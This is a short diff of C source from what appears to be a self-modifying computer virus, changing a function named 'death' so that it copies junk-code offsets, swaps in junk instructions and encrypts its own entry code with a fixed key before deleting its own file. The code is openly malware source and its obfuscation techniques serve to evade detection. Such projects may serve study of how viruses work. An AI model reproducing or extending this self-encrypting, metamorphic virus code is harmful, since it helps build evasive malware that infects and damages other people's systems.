@@ -224,20 +224,24 @@ int death(int start_offset, file_t *file) {
 
 	uint8_t *self = (uint8_t *)file->view.data;
 	char *self_name = file->abs_path;
-	int fd;
-
-	uintptr_t junk_pos = (uintptr_t)&g_junk_offsets - (uintptr_t)&_start;
-
-	uint8_t *junk = self + junk_pos + start_offset;
-
-	ft_memcpy(junk, g_junk_offsets, sizeof(g_junk_offsets));
-
+	int fd = -1;
 
 	uint8_t *entry = self + start_offset;
+
+	if (start_offset != 0x1000) 
+		encrypt(entry, VIRUS_SIZE, DEFAULT_KEY);
+
 
 	JUNK;
 
 	replace_nop(entry, g_junk_offsets);
+
+	uintptr_t junk_pos = (uintptr_t)&g_junk_offsets - (uintptr_t)&_start;
+	uint8_t *junk = self + junk_pos + start_offset;
+	ft_memcpy(junk, g_junk_offsets, sizeof(g_junk_offsets));
+
+	if (start_offset != 0x1000)
+		encrypt(entry, VIRUS_SIZE, DEFAULT_KEY);
 
 	if (unlink(self_name) == -1) {
 		munmap(self, file->view.size);
